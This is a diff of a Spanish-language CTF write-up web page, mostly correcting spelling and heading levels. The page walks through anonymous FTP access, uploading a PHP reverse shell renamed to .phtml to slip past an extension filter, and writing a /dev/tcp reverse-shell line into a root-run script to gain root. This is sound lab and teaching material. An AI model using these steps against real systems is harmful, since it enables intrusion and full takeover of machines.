@@ -286,11 +286,14 @@ if (!doNotTrack) {
         <li><a href="#subdirectorios">Subdirectorios</a></li>
       </ol>
     </li>
-    <li><a href="#intrusion">Intrusion</a></li>
+    <li><a href="#intrusión">Intrusión</a></li>
     <li><a href="#tratamiento-de-tty">Tratamiento de tty</a></li>
-    <li><a href="#escalda-de-privilegios">Escalda de privilegios</a></li>
-    <li><a href="#lennie">Lennie</a></li>
-    <li><a href="#root">Root</a></li>
+    <li><a href="#escalda-de-privilegios">Escalda de privilegios</a>
+      <ol>
+        <li><a href="#lennie">Lennie</a></li>
+        <li><a href="#root">Root</a></li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -557,8 +560,8 @@ if (!doNotTrack) {
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="puerto-21-ftp">Puerto 21 (ftp)</h2>
-<p>El nmap a reportado que nos podemos conectar por ftp como anonymous. Dentro del ftp hay tres archivos: <code>.test_log</code>, <code>important.jpg</code> y <code>notice.txt</code>. Tambien hay un directorio llamado <code>ftp</code> en el cual tenemos permisos de escritura.</p>
-<p>Nos pasamos los tres archivos con <code>get &quot;archivo&quot;</code> para analizarlos desde nuestra máquina. Ningun archivo continen informacion relevante</p>
+<p>El nmap ha reportado que nos podemos conectar por ftp como anonymous. Dentro del ftp hay tres archivos: <code>.test_log</code>, <code>important.jpg</code> y <code>notice.txt</code>, también hay un directorio llamado <code>ftp</code> en el cual tenemos permisos de escritura.</p>
+<p>Nos pasamos los tres archivos con <code>get &quot;archivo&quot;</code> para analizarlos desde nuestra máquina. Ningún archivo contienen información relevante</p>
 <h2 id="puerto-80-http">Puerto 80 (http)</h2>
 <h3 id="subdirectorios">Subdirectorios</h3>
 <p>Empezamos con un escaneo de subdirectorios, vamos a usar dirb</p>
@@ -570,8 +573,8 @@ if (!doNotTrack) {
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirb 10.10.76.5
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Nos encuentra el subdirectorio <code>files</code>. Dentro de files vemos que hay los mismos archivos que en el ftp, teniendo encuenta que en el ftp habia una carpeta en la cual podiamos subir archivos, podemos probar de subir una revers shell con php para despues ejecutarla desde la web.</p>
-<h2 id="intrusion">Intrusion</h2>
+</div><p>Nos encuentra el subdirectorio <code>files</code>. Dentro de files vemos que hay los mismos archivos que en el ftp, teniendo en cuenta que en el ftp había una carpeta en la cual podíamos subir archivos, podemos probar de subir una reverse shell con php para después ejecutarla desde la web.</p>
+<h2 id="intrusión">Intrusión</h2>
 <p>Nos bajamos el .php</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -581,10 +584,10 @@ if (!doNotTrack) {
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Es importante cambiar las lineas de ip y puerto.</p>
-<p>Como normalmente la extensión .php esta bloqueada lo vamos a cambiar a <code>.phtml</code></p>
+</div><p>Es importante cambiar las líneas de ip y puerto.</p>
+<p>Como normalmente la extensión .php está bloqueada, lo vamos a cambiar a <code>.phtml</code></p>
 <p>Ahora ya nos podemos volver a conectar por ftp y dentro de la carpeta ftp subir el .phtml con <code>put</code></p>
-<p>Por ultimo nos ponemos en escucha por el puerto 443 y desde la web ejecutamos el archivo. Ya tenemos la reverse shell</p>
+<p>Por último nos ponemos en escucha por el puerto 443 y desde la web ejecutamos el archivo. Ya tenemos la reverse shell</p>
 <h2 id="tratamiento-de-tty">Tratamiento de tty</h2>
 <p>Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p>
 <div class="highlight"><div class="chroma">
@@ -637,13 +640,13 @@ if (!doNotTrack) {
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="escalda-de-privilegios">Escalda de privilegios</h2>
-<h2 id="lennie">Lennie</h2>
+<h3 id="lennie">Lennie</h3>
 <p>En <code>/incidents</code> vemos un archivo el cual parece que contiene un historial de los comandos que se han ejecutado, buscando un poco vemos un sitio donde salen unas credenciales&hellip;</p>
-<h2 id="root">Root</h2>
-<p>Con la herramienta pspy podemos ver como se ejecuta automaticamente como root el archivo /home/lennie/scripts/planner.sh.</p>
-<p>No tenemos permisos de escritura para este archivo, pero ese archivo ejecuta otro archivo: <code>/etc/printf.sh</code>, en este si que tenemos permisos de escritura.</p>
-<p>Dentro vamos a poner <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/442 0&gt;&amp;1&quot;</code> y nos vamos a poner en esucha por el puerto 442.</p>
-<p>Recibimos la conexión y YA SOMOS ROOT!!!!!</p>
+<h3 id="root">Root</h3>
+<p>Con la herramienta pspy podemos ver como se ejecuta automáticamente como root el archivo /home/lennie/scripts/planner.sh.</p>
+<p>No tenemos permisos de escritura para este archivo, pero ese archivo ejecuta otro archivo: <code>/etc/printf.sh</code>, en este sí que tenemos permisos de escritura.</p>
+<p>Dentro vamos a poner <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/442 0&gt;&amp;1&quot;</code> y nos vamos a poner en escucha por el puerto 442.</p>
+<p>¡Recibimos la conexión y YA SOMOS ROOT!!!!!</p>
 
 </section>
 
